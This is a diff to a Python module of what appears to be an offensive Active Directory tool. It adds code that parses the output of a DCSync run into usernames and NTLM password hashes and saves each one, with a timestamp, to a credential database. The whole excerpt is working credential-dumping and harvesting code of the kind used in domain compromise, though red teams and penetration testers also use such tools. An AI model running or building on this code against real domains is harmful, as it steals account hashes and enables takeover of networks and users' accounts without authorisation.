@@ -1,3 +1,4 @@
+from datetime import datetime, timezone
 import subprocess
 import uuid
 
@@ -6,6 +7,8 @@ from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.utils.conv import escape_filter_chars
 
 from impacket.ldap.ldaptypes import LDAP_SID, SR_SECURITY_DESCRIPTOR
+
+from ..db.database import upsert_user_hash
 
 
 DCSYNC_GUIDS = {
@@ -33,12 +36,29 @@ def run_dcsync(domain, username, password, target):
     for line in output.stdout.splitlines():
         parts = line.split(":")
         if len(parts) > 3 and parts[1].isdigit():
+            parsed = _parse_dcsync_hash(line)
+            if parsed:
+                timestamp = datetime.now(timezone.utc).isoformat()
+                upsert_user_hash(parsed["username"], "ntlmHash", parsed["hash"], timestamp)
             results.append(line)
 
     if not results:
         return ["DCSync ran but no credential material was returned."]
 
     return results
+
+
+def _parse_dcsync_hash(line):
+    parts = line.split(":")
+    if len(parts) < 4:
+        return None
+
+    username = parts[0]
+    ntlm_hash = parts[3]
+    if not username or not ntlm_hash:
+        return None
+
+    return {"username": username, "hash": ntlm_hash}
 
 
 def domain_to_dn(domain):
